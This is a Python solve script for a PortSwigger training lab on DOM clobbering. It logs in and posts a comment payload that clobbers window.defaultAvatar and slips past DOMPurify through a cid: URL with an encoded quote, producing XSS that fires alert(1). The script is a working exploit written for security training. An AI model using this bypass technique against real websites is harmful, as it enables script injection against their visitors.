#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Exploiting DOM clobbering to enable XSS.

The comments script does `let defaultAvatar = window.defaultAvatar || {...}`.
We DOM-clobber `window.defaultAvatar` with a same-id anchor collection whose
second element has name=avatar; its href becomes `defaultAvatar.avatar`.
DOMPurify allows `cid:` URLs without normalizing quotes, so an &quot; entity
smuggles a real `"` into a later attribute context for break-out XSS.

Chrome only. Needs a logged-in session; this script posts via the lab's own
comment form.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


CLOBBER_COMMENT = (
    '<a id=defaultAvatar><a id=defaultAvatar name=avatar '
    'href="cid:&quot;onerror=alert(1)//">'
)
BENIGN_COMMENT = "hi"


def login(lab: str, session: requests.Session, user: str, pw: str) -> None:
    r = session.get(f"{lab}/login")
    token = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    r = session.post(
        f"{lab}/login",
        data={"csrf": token, "username": user, "password": pw},
    )
    r.raise_for_status()


def post_comment(lab: str, session: requests.Session, post_id: int, comment: str, name: str, email: str) -> None:
    r = session.get(f"{lab}/post/comment?postId={post_id}")
    token = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    data = {
        "csrf": token,
        "postId": str(post_id),
        "comment": comment,
        "name": name,
        "email": email,
        "website": "",
    }
    r = session.post(f"{lab}/post/comment", data=data)
    r.raise_for_status()


def main():
    parser = argparse.ArgumentParser(
        description="Solve DOM-based Lab 6: DOM clobbering → DOMPurify cid: bypass XSS (Chrome only)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("--post-id", type=int, default=1, help="Blog post ID (default 1)")
    parser.add_argument("--user", default="wiener")
    parser.add_argument("--password", default="peter")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print("[*] Logging in")
    login(lab, s, args.user, args.password)

    print("[*] Posting clobber payload as first comment")
    post_comment(lab, s, args.post_id, CLOBBER_COMMENT, "attacker", "a@a.com")

    print("[*] Posting trigger comment")
    post_comment(lab, s, args.post_id, BENIGN_COMMENT, "attacker2", "b@b.com")

    print(f"\n[+] Payload posted. Open the following URL in CHROME to fire alert(1):")
    print(f"    {lab}/post?postId={args.post_id}")


if __name__ == "__main__":
    main()
